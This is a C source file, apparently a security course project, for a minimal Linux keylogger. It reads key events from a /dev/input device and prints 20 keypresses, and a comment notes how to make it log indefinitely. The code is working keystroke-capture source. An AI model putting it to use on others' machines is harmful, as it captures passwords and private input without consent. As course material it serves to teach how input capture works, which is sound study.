/*
 * CSCI 6531 Final Project - Simple Keylogger
 * Author: Nick Capurso
 * ------------------------------------------
 * Simple keylogger that logs events from the keyboard's event drivers under /dev/input
 *
 * By default, logs 20 characters, then exits.
 *
 * Usage:
 *      logger <path-to-event-driver>
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>
#include <linux/input.h>

/*
 * Key events from the event driver do not correspond to ASCII
 * values, but rather to a specification of USB.
 * 
 * There is a list of defines in the input-event-codes.h in the kernel:
 * https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h
 *
 * This array corresponds to a subset of those mappings.
 */
char* keyMap[] = {
    "Reserved",
    "Esc",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "=",
    "Backspace",
    "Tab",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "{",
    "}",
    "Enter",
    "LCtrl",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    ";",
    "'",
    "`",
    "LShift",
    "\\",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    ",",
    ".",
    "/",
    "RShift",
    "*",
    "LAlt",
    "Space",
    "CapsLock",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NumLock",
    "ScrollLock",
    "7",
    "8",
    "9",
    "-",
    "4",
    "5",
    "6",
    "+",
    "1",
    "2",
    "3",
    "0",
    ".",
};

// Size of the above array
const int mapSize = sizeof(keyMap) / sizeof(keyMap[0]);

FILE *kbdDev;

// Holds a key event (type, key code, key state (pressed, released, held))
struct input_event kbdEvent;

int main(int argc, char **argv)
{
    // Second command-line parameter will be the key event device file under /dev/input
    assert(argc == 2);
    kbdDev = fopen(argv[1], "r");

    // Loop reads 20 key events. To log forever, just turn into an infinite while loop
    int i = 0;
    while (i < 20){
        // Read the next event
        fread(&kbdEvent, sizeof(struct input_event), 1, kbdDev);

        // There are multiple types of input events (not just the keyboard).
        // We are only interested in *key* events and only those where a key is
        // depressed (value = 1) or held (value = 2)
        if(kbdEvent.type == EV_KEY && (kbdEvent.value == 1 || kbdEvent.value == 2)){
            // Print the key if it exists in the mapping, or just the key code if not
            if(kbdEvent.code >= mapSize){
                printf("%i\n", kbdEvent.code);
            }else{
                printf("%s\n", keyMap[kbdEvent.code]);
            }
            i++;
        }
    }
}
